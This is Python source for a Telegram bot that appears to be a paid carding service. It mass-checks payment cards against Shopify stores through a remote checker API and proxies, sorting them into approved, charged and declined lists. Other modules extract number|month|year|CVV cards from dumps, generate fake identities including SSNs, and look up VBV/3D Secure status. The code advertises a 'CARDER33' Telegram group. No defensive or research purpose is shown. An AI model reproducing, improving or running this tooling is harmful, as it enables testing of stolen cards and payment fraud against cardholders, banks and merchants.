def build_msp_buttons(approved: int, charged: int, declined: int, owner_and_run: str) -> InlineKeyboardMarkup:
    """Show stats + Stop button bound to specific run_id"""
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"✅ Approved: {approved}", callback_data="noop"),
            InlineKeyboardButton(f"🔥 Charged: {charged}", callback_data="noop"),
        ],
        [
            InlineKeyboardButton(f"❌ Declined: {declined}", callback_data="noop"),
            InlineKeyboardButton("⏹ Stop", callback_data=f"stop:{owner_and_run}")
        ]
    ])


# ---------- Networking ----------
async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card: str, proxy: str) -> Dict[str, str]:
    if not site.startswith("http://") and not site.startswith("https://"):
        site = "https://" + site
    url = f"{base_url}?site={site}&cc={card}&proxy={proxy}"
    try:
        r = await session.get(url, timeout=55)
        try:
            data = r.json()
        except Exception:
            return {"response": r.text or "Unknown", "status": "false", "price": "0", "gateway": "N/A"}
        return {
            "response": str(data.get("Response", "Unknown")),
            "status": str(data.get("Status", "false")),
            "price": str(data.get("Price", "0")),
            "gateway": str(data.get("Gateway", "N/A")),
        }
    except Exception as e:
        return {"response": f"Error: {str(e)}", "status": "false", "price": "0", "gateway": "N/A"}


# ---------- Buttons ----------
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    if not query:
        return
    data = query.data or ""
    if data.startswith("stop:"):
        try:
            owner_id, run_id = data.split(":")[1:]
            owner_id = int(owner_id)
        except Exception:
            return
        if query.from_user.id != owner_id:
            await query.answer("⚠️ Not your request!", show_alert=True)
            return

        # Flip only this run’s stop flag
        context.user_data.setdefault("msp_stop_flags", {})[run_id] = True
        await query.answer("⏹ Stopped! Sending results...", show_alert=True)

        # Trigger finalize instantly
        state = context.user_data.get(f"msp_state_{run_id}")
        if state:
            await finalize_results(
                update,
                state["msg"],
                state["cards"],
                state["approved"],
                state["charged"],
                state["declined"],
                state["errors"],
                state["approved_results"],
                state["charged_results"],
                state["declined_results"],
                state["error_results"]
            )
        return
    await query.answer()


# ---------- Runner ----------
async def finalize_results(update: Update, msg, cards, approved, charged, declined, errors,
                           approved_results, charged_results, declined_results, error_results):
    sections = []
    if approved_results:
        sections.append("✅ APPROVED\n" + "\n\n".join(approved_results))
    if charged_results:
        sections.append("🔥 CHARGED\n" + "\n\n".join(charged_results))
    if declined_results:
        sections.append("❌ DECLINED\n" + "\n\n".join(declined_results))
    if error_results:
        sections.append("⚠️ ERRORS\n" + "\n\n".join(error_results))
    final_report = "\n\n============================\n\n".join(sections) if sections else "No results collected."

    file_buf = io.BytesIO(final_report.encode("utf-8"))
    file_buf.name = "shopify_results.txt"

    summary_caption = (
        "📊 <b>𝐅𝐢𝐧𝐚𝐥 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"#𝙏𝙤𝙩𝙖𝙡_𝘾𝙖𝙧𝙙𝙨 ➵ <b>{len(cards)}</b>\n"
        "<pre><code>"
        f"✅ Approved ➵ <b>{approved}</b>\n"
        f"🔥 Charged ➵ <b>{charged}</b>\n"
        f"❌ Declined ➵ <b>{declined}</b>\n"
        f"⚠️ Errors ➵ <b>{errors}</b>"
        "</code></pre>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━"
    )

    if update.message:
        await update.message.reply_document(document=InputFile(file_buf), caption=summary_caption, parse_mode="HTML")
    elif update.callback_query:
        await update.callback_query.message.reply_document(document=InputFile(file_buf), caption=summary_caption, parse_mode="HTML")

    try:
        await msg.delete()
    except Exception:
        pass


async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: List[str], base_url: str, sites: List[str], msg, run_id: str) -> None:
    stop_flags = context.user_data.setdefault("msp_stop_flags", {})
    stop_flags[run_id] = False

    approved = declined = errors = charged = checked = 0
    approved_results, charged_results, declined_results, error_results = [], [], [], []
    proxy = DEFAULT_PROXY
    BATCH_SIZE = 5

    context.user_data[f"msp_state_{run_id}"] = {
        "msg": msg,
        "cards": cards,
        "approved": approved,
        "charged": charged,
        "declined": declined,
        "errors": errors,
        "approved_results": approved_results,
        "charged_results": charged_results,
        "declined_results": declined_results,
        "error_results": error_results
    }

    async with httpx.AsyncClient() as session:
        for i in range(0, len(cards), BATCH_SIZE):
            if stop_flags.get(run_id):
                return
            batch = cards[i:i + BATCH_SIZE]

            results = await asyncio.gather(
                *(check_card(session, base_url, sites[0], card, proxy) for card in batch),
                return_exceptions=True
            )

            for card, resp in zip(batch, results):
                if stop_flags.get(run_id):
                    return
                if isinstance(resp, Exception):
                    resp = {"response": f"Error: {resp}", "status": "false", "price": "0", "gateway": "N/A"}

                resp_upper = (resp.get("response") or "").upper()
                line_resp = f"Response: {resp.get('response','Unknown')}\n Price: {resp.get('price','0')}\n Gateway: {resp.get('gateway','N/A')}"

                if "INSUFFICIENT_FUNDS" in resp_upper or any(k in resp_upper for k in CHARGED_KEYWORDS):
                    charged += 1; charged_results.append(f"🔥 {card}\n {line_resp}")
                elif any(k in resp_upper for k in APPROVED_KEYWORDS):
                    approved += 1; approved_results.append(f"✅ {card}\n {line_resp}")
                elif any(k in resp_upper for k in DECLINED_KEYWORDS):
                    declined += 1; declined_results.append(f"❌ {card}\n {line_resp}")
                else:
                    errors += 1; error_results.append(f"⚠️ {card}\n {line_resp}")
                checked += 1

            try:
                buttons = build_msp_buttons(approved, charged, declined, f"{update.effective_user.id}:{run_id}")
                summary_text = (
                    f"📊 𝙈𝙖𝙨𝙨 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝘾𝙝𝙚𝙘𝙠𝙚𝙧\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"#𝙏𝙤𝙩𝙖𝙡_𝘾𝙖𝙧𝙙𝙨 ➵ {len(cards)}\n"
                    "<pre><code>"
                    f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➵ {approved}\n"
                    f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ➵ {charged}\n"
                    f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ➵ {declined}\n"
                    f"𝐄𝐫𝐫𝐨𝐫𝐬 ➵ {errors}\n"
                    f"𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ➵ {checked} / {len(cards)}\n"
                    "</code></pre>"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                )
                await msg.edit_text(
                    summary_text,
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                    reply_markup=buttons
                )
            except Exception as e:
                logger.warning(f"Edit failed: {e}")

    await finalize_results(update, msg, cards, approved, charged, declined, errors,
                           approved_results, charged_results, declined_results, error_results)


# ---------- /msp command ----------
async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    now = time.time()
    if user_id in last_msp_usage and now - last_msp_usage[user_id] < 5:
        await update.message.reply_text("⏳ Please wait 5 seconds before using /msp again.")
        return
    last_msp_usage[user_id] = now

    cards: List[str] = []
    if context.args:
        cards = extract_cards_from_text(" ".join(context.args))
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        cards = extract_cards_from_text(update.message.reply_to_message.text)
    elif update.message.reply_to_message and update.message.reply_to_message.document:
        try:
            file_obj = await update.message.reply_to_message.document.get_file()
            content = await file_obj.download_as_bytearray()
            text = content.decode("utf-8", errors="ignore")
            cards = extract_cards_from_text(text)
        except Exception:
            await update.message.reply_text("❌ Failed to read the replied document.")
            return

    if not cards:
        await update.message.reply_text("❌ No valid cards found.")
        return
    if len(cards) > 100:
        cards = cards[:100]

    user_data = await get_user(user_id)
    if not user_data:
        await update.message.reply_text("❌ No user data found in DB.")
        return

    if not await consume_credit(user_id):
        await update.message.reply_text("❌ You have no credits left.")
        return

    base_url = user_data.get("base_url", "https://rocks-mbs7.onrender.com/index.php")
    sites = user_data.get("custom_urls", [])
    if not sites:
        await update.message.reply_text("❌ No sites found in your account.")
        return

    run_id = str(uuid.uuid4())[:8]

    initial_summary = (
        f"📊 𝙈𝙖𝙨𝙨 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝘾𝙝𝙚𝙘𝙠𝙚𝙧\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"#𝙏𝙤𝙩𝙖𝙡_𝘾𝙖𝙧𝙙𝙨 ➵ {len(cards)}\n"
        "<pre><code>"
        f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ➵ 0\n"
        f"𝐂𝐡𝐚𝐫𝐠𝐞𝐝 ➵ 0\n"
        f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ➵ 0\n"
        f"𝐄𝐫𝐫𝐨𝐫𝐬 ➵ 0\n"
        f"𝐂𝐡𝐞𝐜𝐤𝐞𝐝 ➵ 0 / {len(cards)}\n"
        "</code></pre>"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    buttons = build_msp_buttons(0, 0, 0, f"{update.effective_user.id}:{run_id}")
    msg = await update.message.reply_text(initial_summary, parse_mode="HTML", disable_web_page_preview=True, reply_markup=buttons)

    task = asyncio.create_task(run_msp(update, context, cards, base_url, sites, msg, run_id))
    task.add_done_callback(lambda t: logger.error(f"/msp crashed: {t.exception()}") if t.exception() else None)











import asyncio
from html import escape
from telegram import Update
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

from db import get_user, update_user

# /removeall command - runs DB update in background and edits the same message
async def removeall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Send initial "processing" message right away (stylish)
    processing_msg = await update.message.reply_text(
        "◇━━〔 ⏳ 𝑹𝒆𝒎𝒐𝒗𝒊𝒏𝒈 𝒀𝒐𝒖𝒓 𝑺𝒊𝒕𝒆𝒔... 〕━━◇\n"
        "🔹 𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕 — this runs in the background.",
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

    # Launch background task to do the actual removal and edit the message when done
    asyncio.create_task(_process_removeall(user_id, processing_msg))


async def _process_removeall(user_id: int, processing_msg):
    """
    Background worker: clears user's custom_urls and updates the original message.
    All errors are caught and not shown to end users.
    """
    try:
        # Verify user exists
        user_data = await get_user(user_id)
        if not user_data:
            await processing_msg.edit_text(
                "◇━━〔 ❌ 𝑼𝒔𝒆𝒓 𝑫𝒂𝒕𝒂 𝑵𝒐𝒕 𝑭𝒐𝒖𝒏𝒅 〕━━◇\n"
                "🔹 𝑵𝒐 𝒂𝒄𝒄𝒐𝒖𝒏𝒕 𝒅𝒂𝒕𝒂 𝒄𝒐𝒖𝒍𝒅 𝒃𝒆 𝒍𝒐𝒂𝒅𝒆𝒅.",
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
            return

        # Perform DB update: clear the array (won't block other handlers)
        await update_user(user_id, custom_urls=[])

        # Optional small delay to make UX feel smooth (non-blocking)
        # await asyncio.sleep(0.4)

        # Final success message (stylish)
        await processing_msg.edit_text(
            "◇━━〔 ✅ 𝑺𝒊𝒕𝒆𝒔 𝑹𝒆𝒎𝒐𝒗𝒆𝒅 〕━━◇\n"
            "🔹 𝑨𝒍𝒍 𝒚𝒐𝒖𝒓 𝒔𝒂𝒗𝒆𝒅 𝒔𝒊𝒕𝒆𝒔 𝒉𝒂𝒗𝒆 𝒃𝒆𝒆𝒏 𝒄𝒍𝒆𝒂𝒓𝒆𝒅.\n"
            "🔹 𝒖𝒔𝒆 <code>/seturl &lt;site&gt;</code> 𝒕𝒐 𝒂𝒅𝒅 𝒏𝒆𝒘 𝒐𝒏𝒆𝒔.",
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except Exception:
        # Generic friendly failure message; do not reveal internals
        try:
            await processing_msg.edit_text(
                "◇━━〔 ⚠️ 𝑬𝒓𝒓𝒐𝒓 〕━━◇\n"
                "🔹 𝑾𝒆 𝒄𝒐𝒖𝒍𝒅𝒏'𝒕 𝒓𝒆𝒎𝒐𝒗𝒆 𝒚𝒐𝒖𝒓 𝒔𝒊𝒕𝒆𝒔 𝒂𝒕 𝒕𝒉𝒊𝒔 𝒎𝒐𝒎𝒆𝒏𝒕.\n"
                "🔹 𝑻𝒓𝒚 𝒂𝒈𝒂𝒊𝒏 𝒍𝒂𝒕𝒆𝒓.",
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
        except Exception:
            # If editing fails, silently pass (we must not crash or leak)
            pass


from telegram import Update
from telegram.ext import ContextTypes
import asyncio
from html import escape
from db import get_user, update_user

async def rsite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove a single site from the user's custom_urls list."""

    user_id = update.effective_user.id

    # ✅ Check if site URL is provided
    if not context.args:
        return await update.message.reply_text(
            "❌ Usage: <code>/rsite &lt;site_url&gt;</code>\n"
            "Example: <code>/rsite example.com</code>",
            parse_mode="HTML"
        )

    site_to_remove = context.args[0].strip()

    # Automatically add https:// if not provided
    if not site_to_remove.startswith(("http://", "https://")):
        site_to_remove = "https://" + site_to_remove

    # Send initial stylish "removing" message
    msg = await update.message.reply_text(
        f"🗑 𝐑𝐞𝐦𝐨𝐯𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐬𝐢𝐭𝐞…\n<code>{escape(site_to_remove)}</code>",
        parse_mode="HTML"
    )

    async def remove_site_bg():
        try:
            user_data = await get_user(user_id)
            if not user_data:
                await msg.edit_text(
                    "❌ 𝐔𝐬𝐞𝐫 𝐝𝐚𝐭𝐚 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.",
                    parse_mode="HTML"
                )
                return

            sites = user_data.get("custom_urls", [])

            if site_to_remove not in sites:
                await msg.edit_text(
                    f"❌ 𝐓𝐡𝐞 𝐬𝐢𝐭𝐞 <code>{escape(site_to_remove)}</code> "
                    f"𝐰𝐚𝐬 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝 𝐢𝐧 𝐲𝐨𝐮𝐫 𝐚𝐝𝐝𝐞𝐝 𝐬𝐢𝐭𝐞𝐬.",
                    parse_mode="HTML"
                )
                return

            # Remove the site
            sites.remove(site_to_remove)
            await update_user(user_id, custom_urls=sites)

            # Final stylish message
            final_text = (
                f"✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 𝐲𝐨𝐮𝐫 𝐬𝐢𝐭𝐞!\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🌐 <code>{escape(site_to_remove)}</code>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"📄 𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐒𝐢𝐭𝐞𝐬: {len(sites)}"
            )

            await msg.edit_text(final_text, parse_mode="HTML")
        except Exception:
            # Silently handle errors
            await msg.edit_text(
                "⚠️ 𝐀𝐧 𝐞𝐫𝐫𝐨𝐫 𝐨𝐜𝐜𝐮𝐫𝐫𝐞𝐝 𝐰𝐡𝐢𝐥𝐞 𝐫𝐞𝐦𝐨𝐯𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐬𝐢𝐭𝐞.",
                parse_mode="HTML"
            )

    # Run in background (non-blocking)
    asyncio.create_task(remove_site_bg())


import asyncio
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from db import get_user, update_user  # your DB functions

# ===== /adurls command =====
async def adurls(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # --- Usage check ---
    if not context.args:
        return await update.message.reply_text(
            "❌ 𝐔𝐬𝐚𝐠𝐞:\n<code>/adurls &lt;site1&gt; &lt;site2&gt; ...</code>\n"
            "⚠️ Maximum 20 sites per user.",
            parse_mode=ParseMode.HTML
        )

    # --- Clean and normalize URLs ---
    sites_to_add_initial = []
    for site in context.args:
        site = site.strip()
        if site:
            if not site.startswith("http://") and not site.startswith("https://"):
                site = "https://" + site
            sites_to_add_initial.append(site)

    if not sites_to_add_initial:
        return await update.message.reply_text(
            "❌ 𝐍𝐨 𝐯𝐚𝐥𝐢𝐝 𝐬𝐢𝐭𝐞 𝐔𝐑𝐋𝐬 𝐩𝐫𝐨𝐯𝐢𝐝𝐞𝐝.\n"
            "Usage: <code>/adurls &lt;site1&gt; &lt;site2&gt; ...</code>",
            parse_mode=ParseMode.HTML
        )

    # --- Initial processing message ---
    processing_msg = await update.message.reply_text(
        f"⏳ 𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐲𝐨𝐮𝐫 𝐬𝐢𝐭𝐞𝐬…\n<code>{escape(' '.join(sites_to_add_initial))}</code>",
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

    async def add_urls_bg(sites_to_add):
        try:
            user_data = await get_user(user_id)
            if not user_data:
                await processing_msg.edit_text(
                    "❌ 𝐔𝐬𝐞𝐫 𝐝𝐚𝐭𝐚 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.",
                    parse_mode=ParseMode.HTML
                )
                return

            # --- Credit check ---
            credits = user_data.get("credits", 0)
            if credits < 1:
                await processing_msg.edit_text(
                    "❌ 𝐘𝐨𝐮 𝐡𝐚𝐯𝐞 𝐧𝐨 𝐜𝐫𝐞𝐝𝐢𝐭𝐬 𝐥𝐞𝐟𝐭.",
                    parse_mode=ParseMode.HTML
                )
                return

            # --- Consume 1 credit ---
            await update_user(user_id, credits=credits - 1)

            # --- Current sites ---
            current_sites = user_data.get("custom_urls", [])

            # --- Filter out duplicates ---
            new_sites = [site for site in sites_to_add if site not in current_sites]

            if not new_sites:
                await processing_msg.edit_text(
                    "⚠️ All provided sites are already added. No new sites to add.",
                    parse_mode=ParseMode.HTML
                )
                return

            # --- Max 20 sites logic ---
            allowed_to_add = 20 - len(current_sites)
            if allowed_to_add <= 0:
                await processing_msg.edit_text(
                    "⚠️ 𝐘𝐨𝐮 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐡𝐚𝐯𝐞 20 𝐬𝐢𝐭𝐞𝐬. Remove some first using /rsite or /removeall.",
                    parse_mode=ParseMode.HTML
                )
                return

            if len(new_sites) > allowed_to_add:
                new_sites = new_sites[:allowed_to_add]
                await processing_msg.edit_text(
                    f"⚠️ Only {allowed_to_add} site(s) will be added to respect the 20-sites limit.",
                    parse_mode=ParseMode.HTML
                )
                await asyncio.sleep(2)  # allow user to read the warning

            # --- Add new sites ---
            updated_sites = current_sites + new_sites
            await update_user(user_id, custom_urls=updated_sites)

            # --- Final stylish message ---
            final_msg = (
                f"✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐚𝐝𝐝𝐞𝐝 {len(new_sites)} 𝐬𝐢𝐭𝐞(s)!\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🌐 𝐓𝐨𝐭𝐚𝐥 𝐒𝐢𝐭𝐞𝐬: {len(updated_sites)} / 20\n"
                f"💲 𝐂𝐫𝐞𝐝𝐢𝐭 𝐔𝐬𝐞𝐝: 1"
            )

            await processing_msg.edit_text(final_msg, parse_mode=ParseMode.HTML)

        except Exception as e:
            await processing_msg.edit_text(
                f"⚠️ 𝐀𝐧 𝐞𝐫𝐫𝐨𝐫 𝐨𝐜𝐜𝐮𝐫𝐫𝐞𝐝 𝐰𝐡𝐢𝐥𝐞 𝐚𝐝𝐝𝐢𝐧𝐠 𝐬𝐢𝐭𝐞𝐬:\n<code>{escape(str(e))}</code>",
                parse_mode=ParseMode.HTML
            )

    # --- Run in background ---
    asyncio.create_task(add_urls_bg(sites_to_add_initial))





from faker import Faker
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "https://t.me/CARDER33"

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\(\)~`>#+\-=|{}.!\\])', r'\\\1', str(text))
    # Notice: [ and ] are NOT escaped

async def fk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates fake identity info."""

    # Cooldown check
    if not await enforce_cooldown(update.effective_user.id, update):
        return

    user_id = update.effective_user.id
    user_data = await get_user(user_id)

    # Deduct 1 credit if available
    if user_data['credits'] <= 0 or not await consume_credit(user_id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )

    country_code = context.args[0] if context.args else 'en_US'
    try:
        fake = Faker(country_code)
    except:
        fake = Faker('en_US')

    # Generate and escape values
    name = escape_markdown_v2(fake.name())
    dob = escape_markdown_v2(fake.date_of_birth().strftime('%Y-%m-%d'))
    ssn = escape_markdown_v2(fake.ssn())
    email = escape_markdown_v2(fake.email())
    username = escape_markdown_v2(fake.user_name())
    phone = escape_markdown_v2(fake.phone_number())
    job = escape_markdown_v2(fake.job())
    company = escape_markdown_v2(fake.company())
    street = escape_markdown_v2(fake.street_address())
    address2 = escape_markdown_v2(fake.secondary_address())
    city = escape_markdown_v2(fake.city())
    state = escape_markdown_v2(fake.state())
    zip_code = escape_markdown_v2(fake.zipcode())
    country = escape_markdown_v2(fake.country())
    ip = escape_markdown_v2(fake.ipv4_public())
    ua = escape_markdown_v2(fake.user_agent())

    # Only escape the content inside the brackets, keep brackets literal
    bullet_text = "\[⌇\]"   # Escaped so [] stay visible in MarkdownV2
    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"


    output = (
        "━━━[ 🧑‍💻 𝙁𝙖𝙠𝙚 𝙄𝙣𝙛𝙤 ]━\n"
        f"{bullet_link} 𝙉𝙖𝙢𝙚 ➳ `{name}`\n"
        f"{bullet_link} 𝘿𝙤𝘽 ➳ `{dob}`\n"
        f"{bullet_link} 𝙎𝙎𝙉 ➳ `{ssn}`\n"
        f"{bullet_link} 𝙀𝙢𝙖𝙞𝙡 ➳ `{email}`\n"
        f"{bullet_link} 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ➳ `{username}`\n"
        f"{bullet_link} 𝙋𝙝𝙤𝙣𝙚 ➳ `{phone}`\n"
        f"{bullet_link} 𝙅𝙤𝙗 ➳ `{job}`\n"
        f"{bullet_link} 𝘾𝙤𝙢𝙥𝙖𝙣𝙮 ➳ `{company}`\n"
        f"{bullet_link} 𝙎𝙩𝙧𝙚𝙚𝙩 ➳ `{street}`\n"
        f"{bullet_link} 𝘼𝙙𝙙𝙧𝙚𝙨𝙨 2 ➳ `{address2}`\n"
        f"{bullet_link} 𝘾𝙞𝙩𝙮 ➳ `{city}`\n"
        f"{bullet_link} 𝙎𝙩𝙖𝙩𝙚 ➳ `{state}`\n"
        f"{bullet_link} 𝙕𝙞𝙥 ➳ `{zip_code}`\n"
        f"{bullet_link} 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➳ `{country}`\n"
        f"{bullet_link} 𝙄𝙋 ➳ `{ip}`\n"
        f"{bullet_link} 𝙐𝘼 ➳ `{ua}`\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    await update.effective_message.reply_text(
        output,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )





import re
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Escape function for MarkdownV2
def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def fl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Extracts all cards from a dump (message or reply)."""

    user_id = update.effective_user.id
    user_data = await get_user(user_id)

    # Check credits
    if user_data.get('credits', 0) <= 0:
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Determine input text
    if update.message.reply_to_message and update.message.reply_to_message.text:
        dump = update.message.reply_to_message.text
    elif context.args:
        dump = " ".join(context.args)
    else:
        return await update.effective_message.reply_text(
            "❌ Please provide or reply to a dump containing cards\\. Usage: `/fl <dump or reply>`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Deduct credit
    if not await consume_credit(user_id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Regex to find cards: number|mm|yy|cvv (cvv 3 or 4 digits, year 2 or 4 digits)
    card_pattern = re.compile(
        r"\b(\d{13,16})\|(\d{1,2})\|(\d{2}|\d{4})\|(\d{3,4})\b"
    )
    cards_found = ["{}|{}|{}|{}".format(m[0], m[1].zfill(2), m[2][-2:], m[3]) for m in card_pattern.findall(dump)]
    count = len(cards_found)

    if cards_found:
        # Each card in monospace with proper escaping
        extracted_cards_text = "\n".join([f"`{escape_markdown_v2(card)}`" for card in cards_found])
    else:
        extracted_cards_text = "_No cards found in the provided text\\._"

    msg = (
        f"╭━ [ 💳 𝗘𝘅𝘁𝗿𝗮𝗰𝘁𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ] \n"
        f"┣ ❏ Total ➳ {count}\n"
        f"╰━━━━━━━\n\n"
        f"{extracted_cards_text}"
    )

    await update.effective_message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)






# --- Imports ---
import aiohttp
import asyncio
import logging
import time
import html
import re
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from bin import get_bin_info
from db import get_user, update_user  # assuming you have these functions

logger = logging.getLogger(__name__)

# --- Constants ---
BULLET_GROUP_LINK = "https://t.me/CARDER33"
bullet_text = "[⌇]"
bullet_link = f'<a href="{BULLET_GROUP_LINK}">{bullet_text}</a>'

DEVELOPER_NAME = "kคli liຖนxx"
DEVELOPER_LINK = "https://t.me/Kalinuxxx"
developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"

# --- Credit System ---
async def consume_credit(user_id: int) -> bool:
    try:
        user_data = await get_user(user_id)
        if user_data and user_data.get("credits", 0) > 0:
            await update_user(user_id, credits=user_data["credits"] - 1)
            return True
    except Exception as e:
        logger.warning(f"[consume_credit] Error updating user {user_id}: {e}")
    return False

# --- Shared Regex ---
# --- Shared Regex ---
# Supports: | / : space as separators
FLEX_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

# --- /vbv Command ---
async def vbv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    # --- Credit check ---
    if not await consume_credit(user_id):
        await update.message.reply_text("❌ You don’t have enough credits to use /vbv.")
        return

    # --- Card data extraction ---
    card_data = None

    raw_text = ""
    if context.args:
        raw_text = " ".join(context.args).strip()
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        raw_text = update.message.reply_to_message.text.strip()

    if raw_text:
        match = FLEX_CARD_REGEX.search(raw_text)
        if match:
            cc, mm, yy, cvv = match.groups()
            mm = mm.zfill(2)                   # 06 not 6
            yy = yy[-2:] if len(yy) == 4 else yy  # 2027 → 27
            card_data = f"{cc}|{mm}|{yy}|{cvv}"

    if not card_data:
        await update.message.reply_text(
            "⚠️ Usage:\n"
            "<code>/vbv 4111111111111111|07|2027|123</code>\n"
            "Or reply to a message containing a card.\n\n",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Processing message ---
    processing_text = (
        f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
        f"<pre><code>𝗩𝗕𝗩 𝗖𝗵𝗲𝗰𝗸 𝗢𝗻𝗴𝗼𝗶𝗻𝗴</code></pre>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝟯𝐃 𝗦𝗲𝗰𝘂𝗿𝗲 / 𝗩𝗕𝗩 𝗟𝗼𝗼𝗸𝘂𝗽\n"
    )

    msg = await update.message.reply_text(
        processing_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )

    # --- Run async VBV check ---
    asyncio.create_task(run_vbv_check(msg, update, card_data))




# --- Background worker ---
async def run_vbv_check(msg, update, card_data: str):
    """
    Check 3D Secure / VBV status for a card and display BIN info.
    """
    import time
    start_time = time.time()
    try:
        cc, mes, ano, cvv = card_data.split("|")
    except ValueError:
        await msg.edit_text("❌ Invalid format. Use: /vbv 4111111111111111|07|2027|123")
        return

    bin_number = cc[:6]
    api_url = f"https://rocky-815m.onrender.com/gateway=bin?key=rockysoon&card={card_data}"

    # --- Fetch VBV data ---
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=50) as resp:
                if resp.status != 200:
                    await msg.edit_text(f"❌ API Error (Status {resp.status}). Try again later.")
                    return
                vbv_data = await resp.json(content_type=None)
    except asyncio.TimeoutError:
        await msg.edit_text("❌ API request failed: Timed out ⏳")
        return
    except aiohttp.ClientConnectorError:
        await msg.edit_text("❌ API request failed: Cannot connect 🌐")
        return
    except aiohttp.ContentTypeError:
        await msg.edit_text("❌ API request failed: Invalid JSON 📄")
        return
    except Exception as e:
        await msg.edit_text(f"❌ API request failed: {type(e).__name__} → {e}")
        return

    # --- BIN lookup ---
    try:
        bin_details = await get_bin_info(bin_number)
        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = bin_details.get("bank") or "N/A"
        country_name = bin_details.get("country") or "Unknown"
        country_flag = bin_details.get("country_emoji", "")
    except Exception:
        brand = issuer = "N/A"
        country_name = "Unknown"
        country_flag = ""

    # --- Prepare response ---
    response_text = vbv_data.get("response", "N/A")
